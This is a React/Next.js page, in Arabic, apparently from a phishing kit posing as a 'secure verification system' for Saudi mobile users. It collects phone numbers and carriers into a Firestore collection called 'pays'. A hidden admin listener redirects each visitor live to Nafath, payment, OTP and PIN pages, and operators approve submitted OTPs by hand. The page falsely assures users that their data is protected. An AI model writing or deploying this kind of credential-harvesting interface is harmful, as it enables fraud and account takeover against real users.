"use client"

import { useEffect, useState } from "react"
import { toast } from "sonner"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Phone } from "lucide-react"
import { UnifiedSpinner } from "@/components/unified-spinner"
import { PhoneOtpDialog } from "@/components/phone-otp-dialog"
import { StcCallDialog } from "@/components/stc-call-dialog"

import { db, updateDoc, doc } from "@/lib/firebase"
import { onSnapshot, getDoc } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"

export default function VerifyPhonePage() {
  const [phoneNumber, setPhoneNumber] = useState("")
  const [selectedCarrier, setSelectedCarrier] = useState("")
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [showStcCallDialog, setShowStcCallDialog] = useState(false)
  const [showWaitingLoader, setShowWaitingLoader] = useState(false)
  const [phoneError, setPhoneError] = useState("")

  // Saudi telecom operators
  const telecomOperators = [
    { value: "stc", label: "STC - الاتصالات السعودية" },
    { value: "mobily", label: "Mobily - موبايلي" },
    { value: "zain", label: "Zain - زين" },
    { value: "virgin", label: "Virgin Mobile - فيرجن موبايل" },
    { value: "lebara", label: "Lebara - ليبارا" },
    { value: "salam", label: "SALAM - سلام" },
    { value: "go", label: "GO - جو" }
  ]

  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (!visitorId) return

    console.log("[phone-info] Setting up navigation listener for visitor:", visitorId)

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorId), 
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data()
          console.log("[phone-info] Firestore data received:", data)

          // Admin navigation: Handle page redirects
          if (data.currentStep === "home") {
            console.log("[phone-info] Admin redirecting to home")
            window.location.href = "/"
          } else if (data.currentStep === "nafad") {
            console.log("[phone-info] Admin redirecting to nafad")
            window.location.href = "/nafad"
          } else if (data.currentStep === "payment") {
            console.log("[phone-info] Admin redirecting to payment")
            window.location.href = "/check"
          } else if (data.currentStep === "otp") {
            console.log("[phone-info] Admin redirecting to otp")
            window.location.href = "/veri"
          } else if (data.currentStep === "pin") {
            console.log("[phone-info] Admin redirecting to pin")
            window.location.href = "/confi"
          } else if (typeof data.currentStep === 'number') {
            console.log("[phone-info] Admin redirecting to home with step:", data.currentStep)
            window.location.href = `/`
          }
          // If currentStep === "phone", stay on this page
        }
      },
      (error) => {
        console.error("[phone-info] Firestore listener error:", error)
      }
    )

    return () => {
      console.log("[phone-info] Cleaning up navigation listener")
      unsubscribe()
    }
  }, [])

  // Phone number validation
  const validatePhoneNumber = (phone: string): boolean => {
    // Remove spaces and special characters
    const cleanPhone = phone.replace(/\s/g, "")
    
    // Saudi phone number validation: starts with 05 and 10 digits total
    const saudiPhoneRegex = /^05\d{8}$/
    
    if (!saudiPhoneRegex.test(cleanPhone)) {
      setPhoneError("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام")
      return false
    }
    
    setPhoneError("")
    return true
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "") // Only numbers
    if (value.length <= 10) {
      setPhoneNumber(value)
      if (value.length === 10) {
        validatePhoneNumber(value)
      } else {
        setPhoneError("")
      }
    }
  }

  const handleSendOtp = async () => {
    if (!phoneNumber || !selectedCarrier) return
    
    if (!validatePhoneNumber(phoneNumber)) return

    const visitorID = localStorage.getItem('visitor')
    if (!visitorID) return

    try {
      // Save phone number and carrier to Firebase
      await updateDoc(doc(db, "pays", visitorID), {
        phoneNumber: phoneNumber,
        phoneCarrier: selectedCarrier,
        phoneSubmittedAt: new Date().toISOString(),
        phoneOtpApproved: "pending", // Set to pending
        phoneUpdatedAt: new Date().toISOString()
      })

      // Add phone info to history
      await addToHistory(visitorID, "phone_info", {
        phoneNumber,
        phoneCarrier: selectedCarrier
      }, "pending")

      // Show different dialogs based on carrier
      if (selectedCarrier === "stc") {
        setShowStcCallDialog(true)
      } else {
        setShowWaitingLoader(true)
        // Wait 3 seconds then show OTP dialog
        setTimeout(() => {
          setShowWaitingLoader(false)
          setShowOtpDialog(true)
        }, 3000)
      }
    } catch (error) {
      console.error("Error saving phone data:", error)
      toast.error("حدث خطأ", {
        description: "يرجى المحاولة مرة أخرى",
        duration: 5000
      })
    }
  }

  const handleStcCallComplete = () => {
    setShowStcCallDialog(false)
    setShowOtpDialog(true)
  }

  const handleOtpRejected = async () => {
    const visitorID = localStorage.getItem('visitor')
    if (!visitorID) return

    try {
      // Get current phone data
      const docRef = doc(db, "pays", visitorID)
      const docSnap = await getDoc(docRef)
      
      if (docSnap.exists()) {
        const data = docSnap.data()
        const currentPhoneData = {
          phoneNumber: data.phoneNumber,
          phoneCarrier: data.phoneCarrier,
          rejectedAt: new Date().toISOString()
        }
        
        // Save rejected phone data and reset status
        await updateDoc(docRef, {
          oldPhoneInfo: data.oldPhoneInfo ? [...data.oldPhoneInfo, currentPhoneData] : [currentPhoneData],
          phoneOtpApproved: "pending"
        })
      }
    } catch (error) {
      console.error("Error saving rejected phone data:", error)
    }
    
    setShowOtpDialog(false)
    setPhoneNumber("")
    setSelectedCarrier("")
    toast.error("تم رفض رمز التحقق", {
      description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
      duration: 5000
    })
  }

  if (showWaitingLoader) {
    return <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
  }

  return (
    <>
      <div
        className="min-h-screen bg-gradient-to-b from-[#1a5c85] to-[#2d7ba8] flex items-center justify-center p-4"
        dir="rtl"
      >
        <div className="w-full max-w-lg space-y-6">
          {/* Header */}
          <div className="text-center text-white space-y-2 mb-8">
            <h1 className="text-4xl font-bold text-balance">نظام التحقق الآمن</h1>
            <p className="text-lg text-white/90">تحقق من هويتك بأمان وسرعة</p>
          </div>

          {/* Main Card */}
          <Card className="p-6 space-y-6">
            {/* Icon and Title */}
            <div className="text-center space-y-4">
              <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-[#1a5c85]">
                <Phone className="w-10 h-10 text-white" />
              </div>
              <div>
                <h2 className="text-2xl font-bold text-gray-900 mb-2">التحقق عن رقم الجوال</h2>
                <p className="text-sm text-gray-600">الرجاء إدخال رقم الجوال واختيار شركة الاتصالات للمتابعة</p>
              </div>
            </div>

            {/* Phone Number Input */}
            <div className="space-y-2">
              <Label htmlFor="phone" className="text-right block text-gray-700 font-semibold">
                رقم الجوال *
              </Label>
              <div className="relative">
                <Input
                  id="phone"
                  type="tel"
                  placeholder="05xxxxxxxx"
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                  className={`text-right pr-20 text-lg h-12 ${phoneError ? "border-red-500" : ""}`}
                  dir="ltr"
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-semibold">+966</div>
              </div>
              {phoneError && (
                <p className="text-red-500 text-sm text-right">{phoneError}</p>
              )}
            </div>

            {/* Carrier Dropdown */}
            <div className="space-y-2">
              <Label htmlFor="carrier" className="text-right block text-gray-700 font-semibold">
                شركة الاتصالات *
              </Label>
              <select
                id="carrier"
                value={selectedCarrier}
                onChange={(e) => setSelectedCarrier(e.target.value)}
                className="w-full h-12 text-right text-base border-2 rounded-lg px-4 bg-white focus:border-[#1a5c85] focus:outline-none shadow-sm appearance-none cursor-pointer"
                style={{
                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 9L1 4h10z'/%3E%3C/svg%3E")`,
                  backgroundRepeat: 'no-repeat',
                  backgroundPosition: 'left 1rem center',
                  paddingLeft: '2.5rem'
                }}
              >
                <option value="">اختر شركة الاتصالات</option>
                {telecomOperators.map((operator) => (
                  <option key={operator.value} value={operator.value}>
                    {operator.label}
                  </option>
                ))}
              </select>
            </div>

            {/* Submit Button */}
            <Button
              onClick={handleSendOtp}
              className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={!phoneNumber || !selectedCarrier || phoneNumber.length !== 10 || !!phoneError}
            >
              <Phone className="ml-2 h-5 w-5" />
              إرسال رمز التحقق
            </Button>

            {/* Info Box */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
              <p className="text-sm text-blue-900">🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية</p>
            </div>
          </Card>
        </div>
      </div>

      {/* STC Call Dialog */}
      <StcCallDialog 
        open={showStcCallDialog} 
        onComplete={handleStcCallComplete}
      />

      {/* Phone OTP Dialog */}
      <PhoneOtpDialog 
        open={showOtpDialog} 
        onOpenChange={setShowOtpDialog} 
        phoneNumber={phoneNumber}
        onRejected={handleOtpRejected}
      />
    </>
  )
}
